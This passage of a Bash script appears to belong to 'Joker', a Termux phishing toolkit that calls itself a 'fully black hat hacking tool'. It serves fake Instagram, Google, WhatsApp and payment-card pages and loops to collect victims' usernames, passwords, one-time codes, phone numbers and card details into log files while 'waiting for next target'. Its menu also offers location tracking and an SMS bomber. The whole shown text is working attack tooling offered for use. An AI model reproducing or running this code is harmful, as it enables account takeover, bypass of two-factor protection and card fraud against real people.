echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/igpass.txt
rm pass.txt
fi

if [ -e otp.txt ];
then

echo -e "\e[98m \nOTP : $(cat otp.txt)  "
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
rm otp.txt
fi





done
;;
2)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="ig_followers"

cd ig_followers
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites

url="insta_followers"
cd insta_followers
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
4)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="ig_verify"

cd ig_verify
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;
esac

elif [ $OP1 == 3 ];
then
clear
mpv m/click.mp3 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> GOOGLE                     "
echo -e "\e[96m               [\e[92m2\e[96m]==> GOOGLE POLL                "
echo -e "\e[96m               [\e[92m3\e[96m]==> GOOGLE NEW                 "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

echo -e "\n"
read -p "CHOOSE ATTACK : " GG
case $GG in
1)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/

url="google"
cd google 
local
ip
while true;

do
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/googlepass.txt
rm pass.txt

fi

if [ -e otp.txt ];
then

echo -e "\e[98m \nOTP : $(cat otp.txt)  "

rm otp.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;

2)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="google_poll"

cd google_poll
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites
url="google_new"


cd google_new
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> /data/data/com.termux/files/usr/bin/Joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;

esac

elif [ $OP1 == 4 ];
then
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="whatsapp"

cd whatsapp
local
while true;

do
ip
if [ -e number.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nNUMBER : $(cat number.txt)  "
#cat usernames.txt >> /data/data/com.termux/files/usr/bin/Joker/www/ig.txt
rm number.txt
fi
if [ -e otp.txt ];
then

echo -e "\e[98m \nOTP : $(cat otp.txt)  "
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
rm otp.txt
fi
done

elif [ $OP1 == 00 ];
then
mpv m/click.mp3 > /dev/null 2>1& 
choose
option

else
clear
mpv m/error.mp3 > /dev/null 2>1&
mpv /data/data/com.termux/files/usr/bin/Joker/error1.wav > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                              ERROR"
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
sleep 3.0
clear
social1
social

fi



}





new(){
clear
mpv /data/data/com.termux/files/usr/bin/Joker/m/create.wav > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|" | pv -qL 20
echo -e "\e[96m                                                             " | pv -qL 20
echo -e "\e[96m                       WHATS NEW IN JOKER 2.2" | pv -qL 20
echo -e "\e[96m                • CARD CAPTURE ADDED + OTP              " | pv -qL 20
echo -e "\e[96m                • LITE SIZE                        " | pv -qL 10
echo -e "\e[96m                • BUG FIXED                             " | pv -qL  10
echo -e "\e[96m                • CRASH FIXED                          " | pv -qL 10
echo -e "\e[96m                • NEW UI  ADDED                             " | pv -qL 10
echo -e "\e[96m                • SMS BOMBER                             " | pv -qL  10
echo -e "\e[96m        |=====================================================|" | pv -qL 20
sleep 8.0
choose
option

}


##################


choose(){
clear
#mpv start.mp3 > /dev/null 2>1&
echo -e "                       \e[92m TOOL BY (SUKHDEVR898)\e[0m"
echo
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━[V 2.3]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"
echo -e "\e[96m||------------------------\e[92mSELECT OPTIONS\e[96m--------------------------||"
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"
echo -e "\e[96m                                                                "
echo -e "\e[96m                                                                "
echo -e "\e[96m                      [\e[92m1\e[93m]==> SOCIAL MEDIA [✓]                   "
echo -e "\e[96m                      [\e[92m2\e[93m]==> LOCTAION TRACKER [✓]               "
echo -e "\e[96m                      [\e[92m3\e[93m]==> GAME PSHISH                        "
echo -e "\e[96m                      [\e[92m4\e[93m]==> CARD CAPUTE                        "
echo -e "\e[96m                      [\e[92m5\e[93m]==> ABOUT                              "
echo -e "\e[96m                      [\e[92m6\e[93m]==> UPDATE                             "
echo -e "\e[96m                      [\e[92m7\e[93m]==> EXIT                               "
echo -e "\e[96m                      [\e[92m8\e[93m]==> CHECK SPEED                        "
echo -e "\e[96m                      [\e[93m9\e[98m]==> SMS BOMBER                         "
echo -e "\e[90m                      [\e[95m00\e[94m]==> WHAT'S NEW                        "
echo -e "\e[90m                                  "
echo -e "\e[96m                                                                "
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"
echo -e "\e[96m||--------------------------\e[91mHACK3R\e[96m--------------------------------||"
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"


wget -q --spider $update
if [ $? -eq 0 ];
then
echo -e "\e[96m\t\t\t" 
else
mpv m/error.mp3 > /dev/null 2>1&
mpv m/updating.wav > /dev/null 2>1&
echo -e "\e[96m\t\t\t " | pv -qL 100
echo -e "\e[96m\t\t\t     UPDATE AVAILABLE  [✓]                             " | pv -qL 100
echo -e "\e[96m\t\t\t " | pv -qL 100

fi




read -p " SELECT A OPTION :    " OP

}


option(){


case $OP in
1)
clear 
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;
2)
mpv m/click.mp3 > /dev/null 2>1&
bash loc.sh
;;
5)
mpv m/click.mp3 > /dev/null 2>1&
mpv /data/data/com.termux/files/usr/bin/Joker/m/create.wav > /dev/null 2>1&
clear
echo -e "\e[96m \t\t\t|======================================================|" | pv -qL 50
echo -e "\e[96m\t\t\t              SUKHDEVR898                              " | pv -qL 50
echo -e "\e[96m\t\t\t       FACEBOOK : https://m.facebook.com/sukhdevr898   " | pv -qL 50
echo -e "\e[96m\t\t\t      INSTAGRAM : https://m.instagram.com/sukhdevr898  " | pv -qL 50
echo -e "\e[96m\t\t\t        WEBSITE : https://sukhdevr898.site123.me       " | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50
echo -e "\e[96m\t\t\t |======================================================|" | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50 
echo -e "\e[96m\t\t\t             FULLY BLACK HAT HACKING TOOL              " | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50
echo -e "\e[96m\t\t\t |======================================================|" | pv -qL 50
sleep 5.0
choose 
option
;;
3) 
mpv m/click.mp3 > /dev/null 2>1&
clear
game 
;;
4)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="card"

cd card
local 
while true;

do
ip
if [ -e data.txt ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \n  $(cat data.txt)  "
cat data.txt >> /data/data/com.termux/files/usr/bin/Joker/www/data.txt
rm data.txt 
fi
if [ -e otp.txt ];
then

echo -e "\e[98m \n  \n \n$(cat otp.txt)  \n \n"
rm otp.txt

echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
6)
mpv m/click.mp3 > /dev/null 2>1&
update
;;
7) 
mpv m/click.mp3 > /dev/null 2>1&
exit 1
;;
8)
mpv m/click.mp3 > /dev/null 2>1&
speed
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\e[94m    DO YOU WANT TO SPEEDTEST AGAIN \n\t\t PRESS ENTER... \n\t\tOTHERWISE TYPE 'n' "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
read -p " CTRL + C FOR EXIT " spd
if [ $spd == "n" ];
then
choose 
option

else
speed
fi
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
clear
new
;;
9)
mpv m/click.mp3 > /dev/null 2>1&
sbomb
;;

*)
mpv m/error.mp3 > /dev/null 2>1&
mpv /data/data/com.termux/files/usr/bin/Joker/m/error1.wav > /dev/null 2>1&
echo -e "\e[96m\t\t\t " | pv -qL 10   
echo -e "\e[96m\t\t\t            SELECT VAILID OPTION [×]                   " | pv -qL 50
echo -e "\e[96m\t\t\t " | pv -qL 20
sleep 2.0
choose
option
;;
esac
}



connect(){



while true ;
do
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CONNECTING....[!] " | pv -qL 10
echo -e "\e[96m\t\t\t\n\n"


wget -q --spider $connect


if [ $? -eq 0 ];
then
mpv /data/data/com.termux/files/usr/bin/Joker/m/start.mp3 > /dev/null 2>1&
echo -e "\e[96m\t\t\t\n\n"
echo -e "\e[96m\n\t\t\t |========= NOW  YOU ARE CONNECTED WITH SERVER ✓    ===|" | pv -qL 10
#banner
choose
option
else
mpv m/error.mp3 > /dev/null 2>1&
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     NOT CONNECTED [×]                                 " | pv -qL 20
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CHECK INTERNET CONNECTION OTHERWISE               " | pv -qL 20
echo -e "\e[96m\t\t\t |  THIS TOOL REMOVED BY SUKHDEVR898 YOU CAN'T USE      " | pv -qL 20
echo -e "\e[96m\t\t\t |------------------------------------------------------|" | pv -qL 20
 sleep 2.0

fi
done



}







while true ;
do
connect 
done

